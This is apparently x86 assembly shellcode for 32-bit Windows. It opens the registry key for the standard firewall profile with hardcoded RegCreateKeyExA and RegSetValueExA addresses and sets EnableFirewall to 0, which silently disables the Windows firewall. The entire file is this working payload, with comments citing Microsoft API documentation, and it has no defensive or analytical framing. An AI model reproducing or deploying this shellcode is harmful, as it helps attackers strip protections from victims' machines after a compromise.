[BITS 32]
 
global _start
 
_start:
 
;for the handle
xor edx, edx
mov edi, esp
mov dword [edi], edx
sub esp, 0x10       ;avoid handle being overwritten
 
;Prepare the key - 'SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile'
push edx
push 0x656c6966
push 0x6f725064
push 0x7261646e
push 0x6174535c
push 0x7963696c
push 0x6f506c6c
push 0x61776572
push 0x69465c73
push 0x72657465
push 0x6d617261
push 0x505c7373
push 0x65636341
push 0x64657261
push 0x68535c73
push 0x65636976
push 0x7265535c
push 0x7465536c
push 0x6f72746e
push 0x6f43746e
push 0x65727275
push 0x435c4d45
push 0x54535953
mov edx, esp

; Open the Registry Key
; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
; https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights
; https://github.com/Alexpux/mingw-w64/blob/d0d7f784833bbb0b2d279310ddc6afb52fe47a46/mingw-w64-headers/include/winreg.h 
xor eax, eax
push eax        	;pDisposion = NULL
push edi        	;pHandle
push eax        	;pSecurity = NULL
push 0x0f003f   	;Access = KEY_ALL_ACCESS
push eax        	;Options = REG_OPTION_NON_VOLATILE
push eax        	;Class = NULL
push eax        	;Reserved = NULL
push edx        	;Subkey
push 0x80000002     	;hkey = HKEY_LOCAL_MACHINE
mov eax, 0x77dde9e4 	;RegCreateKeyExA
call eax
 
;RegSetValue ValueName = EnableFireall
push 0x00006c6c
push 0x61776572
push 0x6946656c
push 0x62616e45
mov esi, esp
 
;REgSEtValue buffer = 0 -- Disable 
xor ecx, ecx
push 0x00000000
mov ecx, esp

; Write the registry key=value
; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
; https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h
xor eax, eax
push 0x00000004         ;BufSize = 4 
push ecx         	;Buffer (pointer to value)
push 0x00000004  	;ValueType = REG_DWORD == 4 
push eax         	;Reserved = 0
push esi         	;ValueName
push dword [edi] 	;hKey
mov eax, 0x77ddead7	;RegSetValueExA
call eax

; Close the registry key
; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey 
push dword [edi]    	;hKey
mov eax,  0x77dd6c17 	;RegCloseKey
call eax
